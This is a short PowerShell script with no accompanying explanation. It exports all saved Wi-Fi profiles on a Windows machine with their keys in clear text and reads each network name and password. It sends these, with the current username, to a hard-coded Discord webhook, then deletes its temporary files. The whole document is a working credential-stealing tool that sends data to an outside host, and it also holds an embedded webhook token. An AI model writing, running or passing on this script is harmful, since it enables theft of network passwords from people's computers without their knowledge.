# Define webhook URL
$webhookUrl = 'https://discord.com/api/webhooks/1262103660826071112/--It8rvjLzPFu0xXUnxOa4j9F3F17avmthW1sgRobIakA8HVQlFqG9KggZTIYH0X4L30'

# Temporary directory for exported profiles
$tempDir = New-Item -Path $env:Temp -Name "WifiPasswords" -ItemType Directory -Force

# Export profiles
try {
    netsh wlan export profile key=clear folder=$tempDir.FullName > $null 
} catch {
    Write-Error "Error exporting profiles: $($_.Exception.Message)"
    exit 1  # Exit script with error code
}

# Process each profile
Get-ChildItem $tempDir -Filter *.xml | ForEach-Object {
    try {
        $xml = [xml](Get-Content $_.FullName)
        $wlanName = $xml.WLANProfile.name
        $password = $xml.WLANProfile.MSM.security.sharedKey.keyMaterial

        Write-Output "Found network: $wlanName" # Debugging output

        # Build the message payload
        $payload = @{
            'embeds' = @(
                @{
                    'title' = "Wi-Fi Password Found"
                    'description' = "Password for network '$wlanName'"
                    'fields' = @(
                        @{ 'name' = "Network Name"; 'value' = $wlanName; 'inline' = $true },
                        @{ 'name' = "Password"; 'value' = "||$password||"; 'inline' = $true },
                        @{ 'name' = "Found by"; 'value' = $env:username }
                    )
                }
            )
        }

        # Send to Discord
        Write-Output "Sending to Discord..." # Debugging output
        Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($payload | ConvertTo-Json) -ContentType 'application/json'
    } catch {
        Write-Error "Error processing profile $_.FullName: $($_.Exception.Message)"
    }
}

# Clean up temporary directory
Remove-Item $tempDir -Recurse -Force
